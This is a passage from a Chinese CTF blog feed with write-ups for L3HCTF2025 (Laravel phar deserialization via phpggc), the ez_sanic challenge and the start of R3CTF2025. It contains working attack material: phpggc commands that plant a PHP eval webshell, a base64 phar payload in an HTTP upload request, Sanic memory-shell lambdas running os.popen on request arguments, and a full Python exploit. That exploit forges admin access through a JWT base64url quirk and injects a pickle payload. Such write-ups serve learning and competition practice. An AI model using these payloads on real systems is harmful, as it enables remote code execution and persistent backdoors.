class="code"><pre><span class="line">openssl enc -<span class="keyword">in</span> <span class="string">&quot;/flag_gogogo_chufalong&quot;</span></span><br></pre></td></tr></table></figure><p>不过我文章里面写的手动修改，再修复签名好像比较麻烦，后来狗哥发现phpggc有个参数可以直接构造</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php -d <span class="string">&quot;phar.readonly=0&quot;</span> ./phpggc Laravel/RCE5 <span class="string">&quot;phpinfo();&quot;</span> --phar phar -o /tmp/phar.gif --fast-destruct</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /tmp/phar.gif | <span class="built_in">base64</span> -w 0</span><br></pre></td></tr></table></figure><p>上传触发</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/image/base64</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>1.95.8.146:41164</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>169</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://1.95.8.146:41164</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://1.95.8.146:41164/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"> </span><br><span class="line">&#123;&quot;data&quot;: &quot;data:image/jpeg;base64,PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQoQAgAAAQAAABEAAAABAAAAAADaAQAAYToyOntpOjc7Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjE6e3M6MTY6IgAqAHF1ZXVlUmVzb2x2ZXIiO2E6Mjp7aTowO086MjU6Ik1vY2tlcnlcTG9hZGVyXEV2YWxMb2FkZXIiOjA6e31pOjE7czo0OiJsb2FkIjt9fXM6ODoiACoAZXZlbnQiO086Mzg6IklsbHVtaW5hdGVcQnJvYWRjYXN0aW5nXEJyb2FkY2FzdEV2ZW50IjoxOntzOjEwOiJjb25uZWN0aW9uIjtPOjMyOiJNb2NrZXJ5XEdlbmVyYXRvclxNb2NrRGVmaW5pdGlvbiI6Mjp7czo5OiIAKgBjb25maWciO086MzU6Ik1vY2tlcnlcR2VuZXJhdG9yXE1vY2tDb25maWd1cmF0aW9uIjoxOntzOjc6IgAqAG5hbWUiO3M6NzoiYWJjZGVmZyI7fXM6NzoiACoAY29kZSI7czoyNToiPD9waHAgcGhwaW5mbygpOyBleGl0OyA/PiI7fX19aTo3O2k6Nzt9CAAAAHRlc3QudHh0BAAAAAAAAAAEAAAADH5/2LQBAAAAAAAAdGVzdP1Hbzge69Fj0gj2j+AjIuY4uOoyAgAAAEdCTUI=&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/7/L3HCTF2025/QQ20250716-222546.jpg" alt="1"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php -d phar.readonly=0 ./phpggc Laravel/RCE5 <span class="string">&quot;file_put_contents(&#x27;/var/www/html/public/shell.php&#x27;,&#x27;&lt;?php @eval(\$_POST[1]); ?&gt;&#x27;);&quot;</span> --phar phar -o /tmp/phar.gif --fast-destruct</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /tmp/phar.gif | <span class="built_in">base64</span> -w 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者一条命令解决</span></span><br><span class="line">php -d phar.readonly=0 ./phpggc Laravel/RCE5 <span class="string">&quot;file_put_contents(&#x27;/var/www/html/public/shell.php&#x27;,&#x27;&lt;?php @eval(\$_POST[1]); ?&gt;&#x27;);&quot;</span> --phar phar -o php://output --fast-destruct | <span class="built_in">base64</span> -w 0</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/7/L3HCTF2025/QQ20250716-223319.jpg" alt="1"></p><h2 id="谁在沉默中爆发"><a href="#谁在沉默中爆发" class="headerlink" title="谁在沉默中爆发"></a>谁在沉默中爆发</h2><p>我在网上详细查看了一下remake文章，发现CVE-2021-3129的处理方式与我们这里大不相同。他们的流程大致如下</p><ol><li>清空log内容</li><li>十六进制转化phar文件</li><li>补全文件</li><li>解码文件，只留下poc内容，保证phar文件完整</li><li>phar反序列化</li></ol><p>所以他这里留下的必然是干净的phar文件，可以直接进行phar反序列化，我们回顾fast-destruct的作用</p><p><img src="/../images/achieve/2025/7/L3HCTF2025/QQ20250718-142309.jpg" alt="1"></p><p>都不需要看代码看看报错就知道，所以这里的作用就是避免触发<code>file_put_contents</code>从而影响phar文件结构，导致最后触发不成功！</p>]]></content>
    
    
    <summary type="html">变种CVE？</summary>
    
    
    
    <category term="赛题" scheme="https://baozongwi.xyz/categories/%E8%B5%9B%E9%A2%98/"/>
    
    
    <category term="php" scheme="https://baozongwi.xyz/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>I春秋夏季赛ez_sanic</title>
    <link href="https://baozongwi.xyz/posts/a7823e07.html"/>
    <id>https://baozongwi.xyz/posts/a7823e07.html</id>
    <published>2025-07-15T12:16:08.000Z</published>
    <updated>2025-08-08T04:04:33.986Z</updated>
    
    <content type="html"><![CDATA[<h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><p><img src="/../images/achieve/2025/7/I%E6%98%A5%E7%A7%8B%E5%A4%8F%E5%AD%A3%E8%B5%9Bez_sanic/QQ20250715-201917.jpg" alt="1"></p><p>很简单的一道题，但是不知道为什么零解，周末参加L3HCTF去了，也没看这比赛参赛人数怎么样。但是本着出题就是推进大家学习最近出题人研究的好玩的东西，所以我打算公开本次WP</p><h2 id="做题的前置知识"><a href="#做题的前置知识" class="headerlink" title="做题的前置知识"></a>做题的前置知识</h2><h3 id="JWT-Base64URL-Vul"><a href="#JWT-Base64URL-Vul" class="headerlink" title="JWT Base64URL Vul"></a>JWT Base64URL Vul</h3><p>某天我在一道题里面了解到的一个解析漏洞，其中利用代码大致如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> jwt.utils <span class="keyword">import</span> base64url_decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> base64url_decode(<span class="string">&#x27;&#x27;&#x27;eyJhZG1pbiI6dHJ1ZSwidWlkIjoiMTMzNyJ9&#x27;&#x27;&#x27;</span>)== base64url_decode(<span class="string">&#x27;&#x27;&#x27;eyJhZG1pbiI6dHJ1ZSwidWlkIjoiMTMzNyJ9\\&#x27;&#x27;&#x27;</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们跟进到<code>base64url_decode</code>函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">base64url_decode</span>(<span class="params"><span class="built_in">input</span>: <span class="type">Union</span>[<span class="built_in">bytes</span>, <span class="built_in">str</span>]</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    input_bytes = force_bytes(<span class="built_in">input</span>)</span><br><span class="line"></span><br><span class="line">    rem = <span class="built_in">len</span>(input_bytes) % <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> rem &gt; <span class="number">0</span>:</span><br><span class="line">        input_bytes += <span class="string">b&quot;=&quot;</span> * (<span class="number">4</span> - rem)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base64.urlsafe_b64decode(input_bytes)</span><br></pre></td></tr></table></figure><p>首先就是强制转化成<code>utf-8</code>字节，然后正常进行base64长度区分，如果不对进行补全。看着任何漏洞都没有，但是某次测试中，发现<code>\</code>居然能够相等！</p><h3 id="sanic内存马"><a href="#sanic内存马" class="headerlink" title="sanic内存马"></a>sanic内存马</h3><p>python的内存马大家都知道吧，我某天晚上睡不着看了看好友asalin的文章，发现了这篇文章</p><p><a href="https://asal1n.github.io/2024/10/18/python%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&&%E5%86%85%E5%AD%98%E9%A9%AC/">https://asal1n.github.io/2024/10/18/python%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;&amp;%E5%86%85%E5%AD%98%E9%A9%AC/</a></p><p>最经典的就是进行路由添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.add_route(lambda request: __import__(&quot;os&quot;).popen(request.args.get(&quot;cmd&quot;)).read(),&quot;/shell&quot;, methods=[&quot;GET&quot;])</span><br></pre></td></tr></table></figure><p>不多讲，看看另外两个demo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.exception(Exception)(lambda request, exception: __import__(&quot;sanic&quot;).response.text(__import__(&quot;os&quot;).popen(request.args.get(&quot;cmd&quot;)).read()))</span><br><span class="line"></span><br><span class="line">app.exception(NotFound)(lambda request, exception: __import__(&quot;sanic&quot;).response.text(__import__(&quot;os&quot;).popen(request.args.get(&quot;cmd&quot;)).read()))</span><br></pre></td></tr></table></figure><p>我们可以这么理解，利用一个渲染器定义一个函数，其中嵌套一个<code>lambda</code>函数，并且此处可控的话，我们可以添加恶意代码，即为一个内存马，系统不重启无法失效~</p><p>那我们类似的找个渲染器即可，这里我找到了好几个，禁用了其他的我找到了，保留了一个作为预期解，详情看</p><p><a href="https://baozongwi.xyz/posts/cb7dd2e7.html">https://baozongwi.xyz/posts/cb7dd2e7.html</a></p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64, pickle, jwt, os</span><br><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> difflib <span class="keyword">import</span> SequenceMatcher</span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">APP_SECRET = os.urandom(<span class="number">32</span>).<span class="built_in">hex</span>()</span><br><span class="line">jrl = [jwt.encode(&#123;<span class="string">&quot;admin&quot;</span>: <span class="literal">True</span>, <span class="string">&quot;uid&quot;</span>: <span class="string">&#x27;5201314&#x27;</span>&#125;, APP_SECRET, algorithm=<span class="string">&quot;HS256&quot;</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">similar</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> SequenceMatcher(<span class="literal">None</span>, a, b).ratio() &gt; <span class="number">0.88</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_waf</span>(<span class="params">payload</span>):</span><br><span class="line">    dangerous_keywords = [<span class="string">b&#x27;exception&#x27;</span>, <span class="string">b&#x27;listener&#x27;</span>, <span class="string">b&#x27;get&#x27;</span>, <span class="string">b&#x27;post&#x27;</span>, <span class="string">b&#x27;add_route&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">not</span> <span class="built_in">any</span>(k <span class="keyword">in</span> payload.lower() <span class="keyword">for</span> k <span class="keyword">in</span> dangerous_keywords)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_admin</span>(<span class="params">request</span>):</span><br><span class="line">    token = request.cookies.get(<span class="string">&#x27;session&#x27;</span>, <span class="literal">None</span>).strip().replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> token <span class="keyword">in</span> jrl:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = jwt.decode(token, APP_SECRET, algorithms=[<span class="string">&quot;HS256&quot;</span>])</span><br><span class="line">        <span class="keyword">return</span> payload.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&#x27;gogogo&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user <span class="keyword">and</span> similar(user.lower(), <span class="string">&#x27;admin&#x27;</span>):</span><br><span class="line">        token = jwt.encode(&#123;<span class="string">&quot;admin&quot;</span>: <span class="literal">False</span>, <span class="string">&quot;user&quot;</span>: user&#125;, APP_SECRET, algorithm=<span class="string">&quot;HS256&quot;</span>)</span><br><span class="line">        resp = text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line">        resp.cookies[<span class="string">&quot;session&quot;</span>] = token</span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(<span class="string">&#x27;app.py&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> verify_admin(request):</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    cmd = request.form.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> cmd:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            decoded_cmd = base64.b64decode(cmd)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check_waf(decoded_cmd):</span><br><span class="line">                <span class="keyword">return</span> text(<span class="string">&quot;WAF: Dangerous keywords detected!&quot;</span>)</span><br><span class="line">            pickle.loads(decoded_cmd)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">f&quot;Error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;gogogo&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/jrl&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">jrl_endpoint</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">str</span>(jrl))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代码逻辑很简单，作为一个不被喷的出题人，出的题就是分享trick，没必要去代审那么一两百行的代码，你要我做代审，那你就给个0day来审项目，自己写个屎山，让大家来看，实在是不太优美</p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;执行完整的攻击流程&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url.startswith(<span class="string">&#x27;http&#x27;</span>):</span><br><span class="line">        url = <span class="string">&#x27;http://&#x27;</span> + url</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 目标: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[1] 获取 JRL 中的 admin token...&quot;</span>)</span><br><span class="line">        r1 = requests.get(url + <span class="string">&#x27;/jrl&#x27;</span>, timeout=<span class="number">10</span>)</span><br><span class="line">        admin_token = r1.text.strip(<span class="string">&quot;[]&#x27;\&quot;&quot;</span>) + <span class="string">&#x27;\\\\&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Admin token: <span class="subst">&#123;admin_token[:<span class="number">50</span>]&#125;</span>...&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[2] 生成 pickle 载荷...&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">Shell</span>:</span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">                <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&#x27;app.middleware(&quot;request&quot;)(lambda r: __import__(&quot;os&quot;).popen(&quot;/readflag&quot;).read())&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">        payload = base64.b64encode(pickle.dumps(Shell())).decode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Payload 生成完成&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[3] 植入内存马...&quot;</span>)</span><br><span class="line">        headers = &#123;<span class="string">&#x27;Cookie&#x27;</span>: <span class="string">f&#x27;session=<span class="subst">&#123;admin_token&#125;</span>&#x27;</span>&#125;</span><br><span class="line">        data = &#123;<span class="string">&#x27;cmd&#x27;</span>: payload&#125;</span><br><span class="line">        r2 = requests.post(url + <span class="string">&#x27;/admin&#x27;</span>, headers=headers, data=data, timeout=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Error&#x27;</span> <span class="keyword">in</span> r2.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[-] 植入失败: <span class="subst">&#123;r2.text&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] 内存马植入成功&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[4] 获取 flag...&quot;</span>)</span><br><span class="line">        r3 = requests.get(url, timeout=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">        flag_match = re.search(<span class="string">r&#x27;flag\&#123;[^&#125;]+\&#125;&#x27;</span>, r3.text)</span><br><span class="line">        <span class="keyword">if</span> flag_match:</span><br><span class="line">            flag = flag_match.group(<span class="number">0</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 成功获取 Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> flag</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[-] 未找到 flag，响应: <span class="subst">&#123;r3.text[:<span class="number">100</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] 攻击失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python exp.py &lt;target_url&gt;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Example: python exp.py http://127.0.0.1:8000&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Example: python exp.py 127.0.0.1:8000&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    target_url = sys.argv[<span class="number">1</span>]</span><br><span class="line">    flag = exploit(target_url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n🎉 SUCCESS! Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n❌ Failed to get flag&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">简单题用心拼好题</summary>
    
    
    
    <category term="赛题" scheme="https://baozongwi.xyz/categories/%E8%B5%9B%E9%A2%98/"/>
    
    
    <category term="出题" scheme="https://baozongwi.xyz/tags/%E5%87%BA%E9%A2%98/"/>
    
    <category term="sanic" scheme="https://baozongwi.xyz/tags/sanic/"/>
    
  </entry>
  
  <entry>
    <title>R3CTF2025</title>
    <link href="https://baozongwi.xyz/posts/412ae4c4.html"/>
    <id>https://baozongwi.xyz/posts/412ae4c4.html</id>
    <published>2025-07-05T03:03:59.000Z</published>
    <updated>2025-08-08T04:09:52.234Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Evalgelist"><a href="#Evalgelist" class="headerlink" title="Evalgelist"></a><strong>Evalgelist</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;output&quot;&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$filtered</span> = <span class="title function_ invoke__">str_replace</span>([<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span 